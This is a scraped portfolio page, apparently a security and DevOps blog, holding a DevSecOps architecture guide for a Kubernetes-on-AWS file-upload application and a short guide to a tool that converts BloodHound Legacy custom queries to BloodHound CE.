data-astro-cid-vavxtnxe>xxd</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-YARA Evasion" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="YARA Evasion" id="tag-YARA Evasion" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>YARA Evasion</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label> </div> </div> </div>  <script type="module">function r(){document.querySelectorAll(".dropdown-container").forEach(e=>{a(e)})}function a(t){const e=t.querySelector(".dropdown-trigger");if(!e)return;function s(){if(t.classList.contains("dropdown-active"))return;document.querySelectorAll(".dropdown-container.dropdown-active").forEach(c=>{c.classList.remove("dropdown-active")}),t.classList.add("dropdown-active"),document.addEventListener("click",d);const o=e.querySelector('input[type="text"]'),i=e.querySelector("label");o&&i?(i.classList.add("hidden"),o.classList.remove("hidden"),o.focus()):o&&o.focus()}function n(){if(!t.classList.contains("dropdown-active"))return;t.classList.remove("dropdown-active"),document.removeEventListener("click",d);const o=e.querySelector('input[type="text"]'),i=e.querySelector("label");o&&i&&(o.classList.add("hidden"),i.classList.remove("hidden"))}function d(o){t.contains(o.target)||n()}e.addEventListener("click",o=>{if(o.stopPropagation(),t.classList.contains("dropdown-active")){if(e.matches(":focus-within"))return;n()}else s()})}document.addEventListener("DOMContentLoaded",r);</script> </div> <!-- Right-side Controls Group --> <div class="sort-select-wrapper md:-mr-2 " data-astro-cid-vavxtnxe> <!-- This hidden input is the "source of truth" for the form --> <input type="hidden" name="sort" value="Latest" data-astro-cid-vavxtnxe> <div class="dropdown-container relative flex-grow" data-astro-cid-brbqhzh4> <!-- The trigger area that the user clicks. The parent defines its entire content. --> <div class="bg-header border-secondary-accent dropdown-trigger border-2 rounded cursor-pointer flex items-center" data-astro-cid-brbqhzh4> <div class="sort-trigger-content w-20 px-4 py-2" data-astro-cid-vavxtnxe> <div class="flex items-center gap-2 justify-between" data-astro-cid-vavxtnxe> <span class="text-nowrap font-bold select-none -ml-1" data-astro-cid-vavxtnxe>Sort</span> <svg class="text-white w-4 h-auto flex-shrink-0" data-astro-cid-vavxtnxe="true" fill="currentColor" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 489.389 489.389" xml:space="preserve"> <g> <g> <path d="M261.294,326.102c-8.3-7.3-21.8-6.2-29.1,2.1l-77,86.8v-346.9c0-11.4-9.4-20.8-20.8-20.8s-20.8,9.4-20.8,20.8v346.9
                l-77-86.8c-8.3-8.3-20.8-9.4-29.1-2.1c-8.3,8.3-9.4,20.8-2.1,29.1l113.4,126.9c8.5,10.5,23.5,8.9,30.2,0l114.4-126.9
                C270.694,347.002,269.694,333.402,261.294,326.102z"></path> <path d="M483.994,134.702l-112.4-126.9c-10-10.1-22.5-10.7-31.2,0l-114.4,126.9c-7.3,8.3-6.2,21.8,2.1,29.1
                c12.8,10.2,25.7,3.2,29.1-2.1l77-86.8v345.9c0,11.4,9.4,20.8,20.8,20.8s20.8-8.3,20.8-19.8v-346.8l77,86.8
                c8.3,8.3,20.8,9.4,29.1,2.1C490.194,155.502,491.294,143.002,483.994,134.702z"></path> </g> </g> </svg> </div> </div> </div> <!-- The content panel that is shown/hidden. The parent also defines its entire content. --> <div class="bg-header border-secondary-accent dropdown-content absolute z-50 w-full top-full shadow-lg max-h-60 overflow-y-auto px-2 py-1 border-2 border-t-0 rounded-b" data-astro-cid-brbqhzh4> <div data-astro-cid-vavxtnxe> <!-- The content slot contains simple, clickable divs --> <div class="active-selection sort-option-item border-sky-600  text-nowrap p-1 mb-1 rounded hover:bg-sky-600/30 select-none cursor-pointer" data-value="Latest" data-astro-cid-vavxtnxe> Latest </div><div class="sort-option-item border-sky-600  text-nowrap p-1 mb-1 rounded hover:bg-sky-600/30 select-none cursor-pointer" data-value="Oldest" data-astro-cid-vavxtnxe> Oldest </div><div class="sort-option-item border-sky-600  text-nowrap p-1 mb-1 rounded hover:bg-sky-600/30 select-none cursor-pointer" data-value="Stars" data-astro-cid-vavxtnxe> Stars </div> </div> </div> </div>   </div> <div class="w-full md:w-auto" data-astro-cid-vavxtnxe></div> <div id="view-toggle-links" class="view-toggle flex items-center gap-2 border-2 bg-header border-secondary-accent rounded p-1" data-astro-cid-vavxtnxe> <a href="/work" class=" cursor-pointer px-3 py-1 rounded
[@media(hover:hover)]:hover:bg-sky-500 font-semibold
transition-all duration-300 transform will-change-transform
" data-astro-cid-vavxtnxe>All</a> <a href="/posts" class="active-view  cursor-pointer px-3 py-1 rounded
[@media(hover:hover)]:hover:bg-sky-500 font-semibold
transition-all duration-300 transform will-change-transform
" data-astro-cid-vavxtnxe>Posts</a> <a href="/projects" class=" cursor-pointer px-3 py-1 rounded
[@media(hover:hover)]:hover:bg-sky-500 font-semibold
transition-all duration-300 transform will-change-transform
" data-astro-cid-vavxtnxe>Projects</a> </div> </div> <!-- React Island is now a direct child, allowing it to be centered correctly --> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="ZAgRtU" prefix="r1" component-url="/_astro/WorkCardGrid.C1lVKv7C.js" component-export="default" renderer-url="/_astro/client.BfPWZUkF.js" props="{&quot;allEntries&quot;:[1,[[0,{&quot;id&quot;:[0,&quot;production-ready-devsecops-part-1-architecture-design.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Production-Ready DevSecOps - Part 1: Architecture Design&quot;],&quot;date&quot;:[3,&quot;2025-09-30T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/prod-ready-devsecops-part-1.png&quot;],&quot;tags&quot;:[1,[[0,&quot;DevSecOps&quot;],[0,&quot;GitOps&quot;],[0,&quot;AWS&quot;],[0,&quot;Kubernetes&quot;],[0,&quot;Terraform&quot;],[0,&quot;ArgoCD&quot;],[0,&quot;CI/CD&quot;],[0,&quot;GitHub&quot;],[0,&quot;Cloud Architecture&quot;],[0,&quot;Infrastructure as Code&quot;],[0,&quot;DevOps&quot;],[0,&quot;Programming&quot;],[0,&quot;TypeScript&quot;],[0,&quot;React&quot;],[0,&quot;Astro&quot;],[0,&quot;SQL&quot;],[0,&quot;Redis&quot;],[0,&quot;PostgreSQL&quot;],[0,&quot;Security&quot;]]],&quot;description&quot;:[0,&quot;DevSecOps architecture blueprint for building enterprise-grade production applications with security, high delivery, and low costs using GitOps, Kubernetes, and AWS.&quot;],&quot;featured&quot;:[0,1],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\nMost Kubernetes tutorials cover basic deployment, but production systems require more like: secrets management, cost optimization, high availability, and comprehensive security.\n\nThis guide presents a **battle-tested architecture blueprint** demonstrating how to build *enterprise-grade production* applications with Kubernetes.\n\nUsing **Easy Upload**, a file processing application, as an example we&#39;ll explore real-world DevSecOps patterns from local development through production deployment that you can adapt for your own applications.\n\n**Part 2** will provide the complete implementation guide with code, configurations, and deployment instructions.\n\n## What This Architecture Delivers\n\n- **Cost Optimization**: 50-60% infrastructure cost reduction through GitOps and optimized resource management\n- **Security**: 70-80% fewer vulnerabilities reaching production via shift-left security practices\n- **Speed**: Faster delivery with automated pipelines and ephemeral preview environments\n\n## Simpler Alternatives to Kubernetes\n\nWhile this guide uses **Kubernetes** for its rich ecosystem and portability, the same architectural blueprint (GitOps workflows, shift-left security, CI/CD pipelines, observability patterns) applies to simpler orchestration platforms.\n\n**Alternative orchestration options:**\n- **Managed Container Services**: AWS ECS/Fargate, AWS App Runner, Google Cloud Run, Azure Container Apps for simpler container deployments\n- **Serverless Compute**: AWS Lambda, Azure Functions, Google Cloud Functions for event-driven architectures\n\n**The platform choice depends on your team&#39;s needs and operational complexity, but the DevSecOps blueprint stays the same.**\n\n## Why GitOps?\n\nGitOps fundamentally transformed the workflow of teams I worked with, delivering greater efficiency, faster shipping, enhanced security, and significant cost savings.\n\n### Traditional vs. GitOps Transformation\n\n**Traditionally**, CI/CD pipelines consist of four 24/7 environments (dev, test, staging, production).\n\n**GitOps** replaces them with local dev, ephemeral preview environments per PR, and on-demand staging. Production remains the only 24/7 environment, using reserved instances for cost optimization.\n\nAdditionally, GitOps tools like ArgoCD guarantee automated deployments with Git as a source of truth, eliminating drift, instant rollbacks, and complete audit trail through Git history.\n\n### Results\n\n- **50-60% cost reduction** across teams\n- **Improved security** through automated scanning and GitOps practices\n- **Faster code delivery** with streamlined, automated processes\n- **Effortless scaling** without operational overhead\n- **Enhanced reliability** through automated rollbacks and drift prevention\n\n## Why DevSecOps?\n\n**Traditionally,** security testing is only at the end, which creates bottlenecks and expensive fixes.\n\n**DevSecOps** shifts security left with continuous security from development through production with SAST/DAST scan, and dependency checks integrated from the start.\n\n### Results &amp; Benefits\n\n- **70-80% reduction** in vulnerabilities reaching production\n- **Early detection**: Vulnerabilities caught during development, not testing\n- **Reduced costs**: Early fixes cost significantly less than production remediation\n- **Faster time to market** with security built-in\n\n## Application Architecture Overview\n\n**Easy Upload** is a web application that handles file uploads and processing. This design demonstrates real-world complexity, perfect for showcasing DevSecOps architecture patterns.\n\n### Demo of App Working\n\n&lt;Video src=\&quot;demo_easyupload.mp4\&quot; frameborder=\&quot;0\&quot; loop={true} muted={true} /&gt;\n\n### How it Works\n\n1.  **Frontend → API**:\n    - A **static Astro frontend** uploads files to the **API Service.**\n2.  **API → S3 &amp; Queue**:\n    - The **API stores files** in temporary S3 bucket (`raw-uploads`) and **enqueues jobs** in **BullMQ** for background processing\n3.  **Worker → Processed Storage &amp; Database**:\n    - **Worker Service** consumes **BullMQ jobs**, **processes** files, **uploads** results to `processed-uploads` S3 bucket, and **updates** PostgreSQL metadata\n4.  **Real-time Updates → Frontend**:\n    - Changes pushed back via **Server-Sent Events (SSE)** using Redis Pub/Sub channels\n\n\n### Architecture Benefits\n\n- **BFF Pattern**: Keeps frontend simple and cheap (S3 + CDN) while API handles all business logic.\n- **Async Processing**: Heavy file processing runs separately from user-facing API, ensuring fast responses and independent scaling.\n- **Cost Optimization**: S3 lifecycle policies automatically clean up temporary files to prevent storage bloat.\n- **Independent Scaling**: Frontend, API, and worker services scale based on their specific demands.\n\n## Infrastructure Stack\n\nThe infrastructure is heavily automated, using managed cloud services balanced with Kubernetes workloads for simplicity, security, and flexibility.\n\n\n### Cloud Infrastructure Diagram\n- &lt;Image src=\&quot;images/infra_diagram.svg\&quot; alt=\&quot;Cloud infrastructure diagram\&quot; scale=\&quot;0.5\&quot; /&gt;\n\n\n### Cloud &amp; Infrastructure\n\nUsing vendor-agnostic managed services (like AWS RDS with PostgreSQL) for flexibility without lock-in:\n\n- **Cloud Provider:** AWS\n- **Infrastructure as Code:** Terraform\n- **Container Registry:** AWS ECR\n- **Kubernetes Cluster:** AWS EKS\n- **CI:** GitHub Actions\n- **CD / GitOps:** Argo CD\n- **Database:** AWS RDS PostgreSQL (Multi-AZ)\n- **Cache / Queue:** AWS ElastiCache Redis with BullMQ (Multi-AZ)\n    - Note: BullMQ chosen over RabbitMQ to reduce infrastructure overhead and provide better Node.js integration for producer-consumer patterns.\n- **DNS &amp; TLS:** AWS Route 53 &amp; AWS Certificate Manager\n- **CDN / Entry Point:** AWS CloudFront\n- **File Storage (Buckets):** AWS S3\n- **Static Frontend &amp; Assets:** S3 storage with CloudFront delivery (private origin and cached)\n- **Load Balancing:** AWS Network Load Balancer → Nginx Ingress\n    \n\n### Scaling &amp; High Availability\n\n- **Horizontal Pod Autoscaler**: API &amp; Worker pods scale based on CPU/memory\n- **Karpenter**: Rapid EKS node provisioning with On-Demand + Spot instances\n- **Multi-AZ Deployments**: RDS &amp; ElastiCache\n- **Cost Management**: Terraform resource tagging\n\n### Observability\n\n- **Logs**: JSON logs → Fluent Bit → Loki\n- **Metrics**: Prometheus collection for infrastructure (CPU/Memory), Kubernetes (Pod Status), and application-level metrics (error rates)\n- **Traces**: Tempo for distributed tracing across API and Worker services with OpenTelemetry instrumentation\n- **Visualization**: Grafana dashboards for API, Worker, and cluster health\n- **Alerting**: Prometheus Alertmanager → Slack/PagerDuty with symptom-based alerts (e.g., high API errors)\n\n### Cloud &amp; Infrastructure Security\n\n- **AWS WAF** on CloudFront\n- **Pod Security Admission (PSA)**: Enforces restricted Pod Security Standards on application workloads\n- **Network Policies**: Kubernetes restricts pod ingress/egress\n- **Pod Identity**: EKS Pod Identity grants fine-grained permissions (e.g., specific S3 access)\n- **Secrets Management**: AWS Secrets Manager with External Secrets Operator (ESO)\n\n### Why This Infrastructure Design\n\n- **EKS + Managed Services**: Perfect balance of control (Kubernetes workloads) and simplicity (AWS managed database, cache, secrets).\n- **Terraform**: Ensures reproducible, auditable infrastructure with mandatory change reviews.\n- **Multi-AZ + Autoscaling**: Guarantees high availability while optimizing costs through elastic scaling.\n- **Comprehensive Observability**: Proactive monitoring with distributed tracing (Tempo), metrics (Prometheus), and centralized logging (Loki) prevents downtime and speeds up incident resolution.\n- **Security by Design**: WAF, Pod Security Admission, network policies, pod identity, and secret management enforce least privilege and limit breach impact.\n\n## Platform Infrastructure Pipeline (Terraform)\n\nThe infrastructure defined in Terraform has a dedicated pipeline ensuring all infrastructure changes are code-reviewed, security-scanned, and automatically applied.\n\n**Repository**: `platform-infra-repo`\n\n### Workflow\n\n1.  **Infrastructure Change**: Developer modifies Terraform configuration\n2.  **Pull Request:** Triggers a GitHub Action for automated checks:\n    - **Linting:** `tflint`\n    - **Security Scan:** `trivy config .`\n    - **Plan Review:** `terraform plan` output is posted as a PR comment.\n3.  **Merge:** On approval, a protected GitHub Action runs `terraform apply`.\n\n### Why This Approach\n\n- **Code-Reviewed Infrastructure**: Eliminates risky manual console changes through mandatory PR reviews.\n- **Automated Security Scanning**: Catches misconfigurations before they reach production.\n- **Plan + Apply Separation**: Safer deployments with full visibility into changes before execution.\n- **Git as Source of Truth**: Complete audit trail of every infrastructure modification.\n\n## Application CI/CD Pipeline (GitOps)\n\n- **Development Model: Trunk-Based Development**\n    - All developers work on **short-lived feature branches** off the `main` branch\n    - Feature branches **merged frequently** to reduce integration conflicts\n    - Keeps `main` branch always deployable\n    - Encourages **continuous integration** and fast feedback\n    - Paired with PR previews for testing new features in ephemeral environments\n- **Repositories:**\n    - **`app-repo` (Monorepo)**\n        - Contains all application source code\n        - Monorepo simplifies dependency management and ensures version consistency\n        - Packages separated for easy future microservices migration\n    - **`config-repo` (GitOps repo)**\n        - Stores Kubernetes manifests for staging and production. \n        - Separate from app code for independent deployments. \n        - GitOps Approach: CI updates manifests; Argo CD deploys automatically.\n\n\n### CI/CD Pipeline Workflow Diagram         \n- &lt;Image src=\&quot;images/pipeline_diagram.svg\&quot; alt=\&quot;CI/CD Pipeline Workflow\&quot; scale=\&quot;0.5\&quot; /&gt;\n\n### CI/CD Security\n\n- **Static Code Analysis (SCA)**: Trivy for dependencies, IaC, and containers.\n- **Linting**: ESLint, and Prettier\n- **Vulnerability Scanning:** npm audit for known package vulnerabilities.\n- **Dependency Updates:** Renovate for automated dependency PRs on weekly schedule.\n- **SAST**: Semgrep for PRs and pre-commit hooks.\n- **DAST**: OWASP ZAP for staging and preview environments.\n- **Performance Testing**: k6 load tests validate system performance and scalability in staging\n- **E2E Testing**: Playwright.\n\n### Workflow\n\n1.  **Feature Development**\n    - Developer creates a **feature branch** to work on a new feature.\n2.  **Pre-commit (Optional)**\n    - Format code with **ESLint + Prettier**.\n    - Run quick **SAST** scan using Semgrep.\n3.  **Pull Request (CI)**\n    1.  Merge request from `feature` branch to `main` triggers CI pipeline.\n    2.  **Run Tests &amp; Static Scans:**\n        - Unit &amp; integration tests. \n        - Full **SAST** scan with Semgrep.\n        - **SCA** scan with Trivy on `package.json`.\n        - **npm audit** for known package vulnerabilities.\n4.  **Preview (Optional)**\n    - Deploy PR changes to ephemeral cloud environment using `/deploy-preview` comment\n    - **Features:**\n        - **Fast &amp; cheap builds** via cached Docker layers and Kubernetes diffs\n        - **Realistic data** using cloud services and \&quot;golden snapshot\&quot; database\n        - Optional OWASP ZAP **DAST scan** against preview URL\n5.  **Staging Pipeline**\n    1.  Build production-ready assets &amp; images:\n        - Frontend → static S3 assets\n        - API &amp; Worker → Docker images\n    2.  **Security Scans**: Full Trivy scan of Docker images\n    3.  **Push Artifacts:**\n        - Frontend assets to S3\n        - API &amp; Worker images to AWS ECR with unique tags (e.g., api:v1.2.3, worker:v1.2.3)\n    4.  **Update Kubernetes manifests in** `config-repo` with API &amp; Worker image tags.\n6.  **Staging Deployment**\n    - Argo CD deploys updated manifests to staging cluster.\n    - **Performance tests** run via k6.\n    - **E2E tests** run via Playwright.\n    - Full **DAST scan** using OWASP ZAP.\n7.  **Production Promotion &amp; Rollout**\n    1.  Update production manifests in `config-repo` with validated image tags.\n    2.  Argo CD triggers **Argo Rollouts** for canary deployment:\n        - Gradual rollout (e.g., 5% → 25% → 100%).\n        - Monitored via **Prometheus metrics** (error rates, latency).\n        - Automatic rollback on failure.\n\n### Why This Approach\n\n- **Trunk-Based Development**: Keeps main branch always deployable and minimizes merge conflicts.\n- **Preview Environments**: Enable rapid realistic feedback without disrupting staging environment.\n- **Separated Repositories**: App code and deployment configs evolve independently, reducing coupling risks.\n- **Shift-Left Security**: SAST, DAST, and dependency scanning catch vulnerabilities early in development.\n- **Automated Testing**: E2E and performance tests validate functionality and scalability.\n- **Progressive Delivery**: Argo Rollouts provide safe, automated canary deployments with gradual rollout and instant rollback capability.\n\n\n## Local Development Strategy\n\nThe local development environment mirrors production architecture while enabling rapid iteration. Developers can spin up the complete stack (API, worker services, PostgreSQL, Redis, and S3-compatible storage) with a single command.\n\n### Development Workflow\n\nDevelopment follows a streamlined process that maintains consistency across the team:\n\n1. **Initial Setup:**\n    - This launches all services (api, worker, Postgres, Redis, Minio) in Docker Compose, providing immediate access to a production-like environment.\n    ```bash\n    git clone https://github.com/andrecrafts/easyupload\n    cd easyupload\n    docker compose up --build\n    ```\n2. **Create a feature branch** for new work:\n    ```bash\n    git pull origin main\n    git checkout -b feature/new-functionality\n    ```\n3. **Start the environment** with optional rebuild if dependencies changed:\n    ```bash\n    docker compose build \n    docker compose up\n    ```\n4. **Develop with hot-reloading:** \n    ```bash\n    # Example: Install new packages directly in running containers:\n    docker compose exec api npm install &lt;package&gt;\n    ```\n5. **Submit changes** by committing and opening a pull request to main:\n    - **Pre-commit hooks** automatically format code and run quick static analysis.\n    ```bash\n    git add .\n    git commit -m \&quot;Add new functionality\&quot;\n    git push origin feature/new-functionality\n    ```\n\n### Features &amp; Benefits\n- **Production Parity**: Docker Compose mirrors production services with shared configuration, eliminating \&quot;works on my machine\&quot; issues\n- **Quick Onboarding**: Standardized Docker Compose setup enables new developers to get productive quickly\n- **Fast Feedback Loop**: Hot-reloading and pre-commit hooks provide immediate local validation before CI pipeline.\n- **Flexible Preview Options**:\n    - **Full-stack previews**: Deploy PRs to ephemeral cloud environments (frontend, backend, workers) for complete validation before staging/production.\n    - **Hybrid previews**: Spin up ephemeral cloud dependencies (S3, RDS, Redis) and connect them to local Docker Compose for testing features without full stack costs.\n- **Development in Containers:** VSCode&#39;s [Dev Containers](https://code.visualstudio.com/docs/devcontainers/containers) extension enables development directly inside containers with full IntelliSense and debugging.\n\n\n## Complete Request Flow\n\nThe entire lifecycle of a user action demonstrates how all components work together:\n\n1.  **User Request**: User visits `https://www.easyupload.com`\n2.  **Security Layer**: CloudFront routes request, WAF inspects for threats\n3.  **Frontend Delivery**: Static frontend served from S3 via CloudFront Origin Access Control (OAC)\n4.  **API Routing**: API requests flow through Network Load Balancer → Ingress → API pod\n5.  **File Processing**:\n    - API streams upload to S3 raw bucket\n    - Records metadata in RDS\n    - Enqueues job in Redis\n6.  **Background Processing**:\n    - Worker processes file\n    - Updates processed bucket\n    - Updates database\n    - Publishes Redis Pub/Sub updates\n7.  **Real-time Updates**: User receives progress updates and signed URLs for downloads\n\n### Complete Request Flow Diagram         \n- &lt;Image src=\&quot;images/user_request_flow_chart.svg\&quot; alt=\&quot;Request Flow Diagram\&quot; scale=\&quot;0.5\&quot; /&gt;\n\n## Conclusion\n\nThis architecture demonstrates how GitOps workflows, shift-left security, and cloud-native patterns work together to reduce costs, strengthen security, and accelerate delivery cycles.\n\nBeyond the technical stack, this approach eliminates manual deployment risks and operational overhead allowing teams to focus on building features instead of managing infrastructure.\n\n## What&#39;s Next?\n\nIn **Part 2**, I will publish the **implementation guide**, including:\n\n- Dockerfiles and Docker Compose for local dev\n- Terraform IaC for AWS resources\n- GitHub Actions workflows\n- Kubernetes manifests with ArgoCD and Argo Rollouts\n- Screenshots of successful deployments and the app live on AWS&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/production-ready-devsecops-part-1-architecture-design.mdx&quot;],&quot;digest&quot;:[0,&quot;ea91b759aacb920a&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;production-ready-devsecops-part-1-architecture-design&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/prod-ready-devsecops-part-1.BWsvhd1o.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;convert-bloodhound-legacy-queries-to-ce.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;How to Convert Custom Queries from BloodHound Legacy to BloodHound CE&quot;],&quot;date&quot;:[3,&quot;2025-01-09T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/blood-hound.png&quot;],&quot;tags&quot;:[1,[[0,&quot;BloodHound&quot;],[0,&quot;Red Team&quot;],[0,&quot;Python&quot;],[0,&quot;Security Tools&quot;],[0,&quot;Active Directory&quot;],[0,&quot;Network Security&quot;],[0,&quot;Pentesting&quot;],[0,&quot;Hacking&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;Complete guide to migrate and convert custom queries from Legacy BloodHound to BloodHound CE (Community Edition).&quot;],&quot;featured&quot;:[0,4],&quot;repo&quot;:[0,&quot;andrecrafts/Bloodhound-query-legacy2ce&quot;],&quot;stars&quot;:[0,31],&quot;projectSlug&quot;:[0,&quot;andrecrafts/Bloodhound-query-legacy2ce&quot;]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\n**BloodHound CE** (Community Edition) brings numerous improvements over the legacy version, but the **custom queries format has changed** and you **can&#39;t just drag and drop** the custom queries into **BloodHound CE** to upload custom queries. This is very cumbersome since a lot of **great custom queries** were made for **BloodHound Legacy**.\n\nTo make sure you can still use the awesome queries from **BloodHound Legacy**, I created a **tool to automatically convert and upload** any custom query from **BloodHound Legacy** to **BloodHound CE**.\n\nTo **learn more about the tool**, you can **find its GitHub repository** here:\n- [https://github.com/WafflesExploits/Bloodhound-query-legacy2ce](https://github.com/WafflesExploits/Bloodhound-query-legacy2ce)\n\n## 🎥 Quick Demo of the tool:\n&lt;Video src=\&quot;bh_upload_queries.mp4\&quot; frameborder=\&quot;0\&quot; loop={true} muted={true} /&gt;\n\n## Step-by-Step Instructions\nHere&#39;s how you can use this tool to quickly convert and upload your favorite custom queries\n- [1. Select a Custom Query Collection](#1-select-a-custom-query-collection)\n- [2. Get the BloodHound&#39;s API JWT](#2-get-the-bloodhounds-api-jwt)\n- [3. Running the Tool](#3-running-the-tool)\n- [4. Verifying Your Queries](#4-verifying-your-queries)\n\n### 1\\. Select a Custom Query Collection\n\nHere are some popular query collections you can test with:\n\n- [AzureHound Custom Queries](https://github.com/emiliensocchi/azurehound-queries/tree/main)\n- [ZephrFish Custom Queries](https://raw.githubusercontent.com/ZephrFish/Bloodhound-CustomQueries/refs/heads/main/customqueries.json)\n- [Hausec Custom Queries](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)\n\n### 2\\. Get the BloodHound&#39;s API JWT\n\n1. Open BloodHound&#39;s API Explorer\n2. Find the \&quot;Get Self API\&quot; request and click \&quot;Try It Out\&quot;\n   - &lt;Image src=\&quot;images/837f0e93cbe141319eaa353be1402439.png\&quot; alt=\&quot;8c116f87c7c38fee18bfa7669901f475.png\&quot; width=\&quot;591\&quot; height=\&quot;138\&quot; /&gt;\n3. Execute the request\n4. Copy your JWT Token from the Authorization Bearer header\n   - &lt;Image src=\&quot;images/2bfcbbf271ab47afb56f822645654d7b.png\&quot; alt=\&quot;e562b5a4f701cbac39d2a1c306da1ac7.png\&quot; width=\&quot;557\&quot; height=\&quot;200\&quot; /&gt;\n\n### 3\\. Running the Tool\n\nAfter grabbing the JWT Token, you can install the tool like so:\n\n```bash\ngit clone https://github.com/WafflesExploits/Bloodhound-query-legacy2ce\ncd Bloodhound-query-legacy2ce\npip install -r requirements.txt\n```\n\nRun the command below to convert and upload your custom queries:\n\n```bash\npython upload_bloodhound_queries.py --input-file customqueries.json --jwt-token &lt;YOUR_JWT_TOKEN&gt;\n```\n\nThe tool supports additional options:\n1. Convert only (no upload): --convert-only --output-file output-file-name.json\n2. Specify API URL: --api-url API-URL \n   - (By defaults the tool uses: http://localhost:8080/api/v2/saved-queries)\n\n### 4\\. Verifying Your Queries\n\nAfter upload, verify your queries in BloodHound CE:\n1. Go to the Explore tab\n2. Select the Cypher tab\n3. Click the folder icon (📁)\n4. Open \&quot;Custom Queries\&quot; from the dropdown\n   - &lt;Image src=\&quot;images/dd93da6950e748e5be204b7d396eefde.png\&quot; alt=\&quot;062c8b6b5dffbb7a3fa59ea7594fba59.png\&quot; width=\&quot;279\&quot; height=\&quot;257\&quot; /&gt;\n\nThat&#39;s it! You can now use your favorite BloodHound Legacy queries in BloodHound CE. Happy Hunting! 